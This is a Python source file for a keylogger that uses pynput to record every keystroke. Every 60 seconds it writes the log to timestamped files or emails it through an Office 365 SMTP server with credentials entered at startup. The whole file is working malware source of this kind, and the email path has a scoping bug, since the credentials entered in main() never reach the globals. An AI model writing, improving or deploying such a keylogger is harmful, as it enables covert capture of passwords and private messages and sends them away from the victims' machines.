import os
from datetime import datetime
from pynput import keyboard
import smtplib
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# Configuration
LOG_FILE = 'keylog.txt'  # Output file for logged keystrokes
BUFFER_SIZE = 100  # Flush buffer every N keystrokes to avoid memory issues
REPORT_METHOD = "file"  # "file" or "email"
SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""


class KeyLogger:
    """
    A simple keylogger class to handle keystroke capture and logging.
    """
    
    def __init__(self):
        """
        Initialize the keylogger.
        """
        self.log = ""  # Log string
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    

    
    def on_key_press(self, key):
        """
        Callback function triggered on each key press.
        
        Args:
            key: The pressed key object from pynput.
        """
        try:
            # Handle printable characters
            char = key.char
            if char:
                self.log += char
        except AttributeError:
            # Handle special keys (e.g., space, enter, shift)
            special_key = self._get_special_key_name(key)
            self.log += f'[{special_key}]'
    
    def on_key_release(self, key):
        """
        Callback for key release; used to detect stop signal (e.g., ESC key).
        
        Args:
            key: The released key object.
        """
        # Stop logging on ESC key release
        if key == keyboard.Key.esc:
            self.report()
            print("Logging stopped.")
            return False  # Stop the listener
    
    def _get_special_key_name(self, key) -> str:
        """
        Convert special keys to readable names.
        
        Args:
            key: The special key object.
            
        Returns:
            str: Human-readable name for the key.
        """
        special_keys = {
            keyboard.Key.space: 'SPACE',
            keyboard.Key.enter: 'ENTER',
            keyboard.Key.tab: 'TAB',
            keyboard.Key.backspace: 'BACKSPACE',
            keyboard.Key.shift: 'SHIFT',
            keyboard.Key.ctrl: 'CTRL',
            keyboard.Key.alt: 'ALT',
            keyboard.Key.caps_lock: 'CAPS_LOCK',
            keyboard.Key.esc: 'ESC',
        }
        return special_keys.get(key, f'UNKNOWN({key})')

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        self.update_filename()
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, message, password, verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:\n{message}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            if REPORT_METHOD == "email":
                self.sendmail(EMAIL_ADDRESS, self.log, EMAIL_PASSWORD)
            elif REPORT_METHOD == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=SEND_REPORT_EVERY, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start_logging(self):
        """
        Start the keylogger listener.
        Press ESC to stop logging.
        """
        print("Keylogger started. Press ESC to stop.")
        print(f"Reports will be sent via: {REPORT_METHOD}")
        self.start_dt = datetime.now()
        self.report()

        # Start the keyboard listener
        with keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        ) as listener:
            listener.join()


def main():
    """Main entry point to run the keylogger."""
    if REPORT_METHOD == "email":
        EMAIL_ADDRESS = input("Enter the email: \n")
        EMAIL_PASSWORD = input("Enter the email password: \n")
    logger = KeyLogger()
    try:
        logger.start_logging()
    except KeyboardInterrupt:
        logger.report()
        print("\nKeylogger interrupted. Reports saved.")


if __name__ == "__main__":
    main()
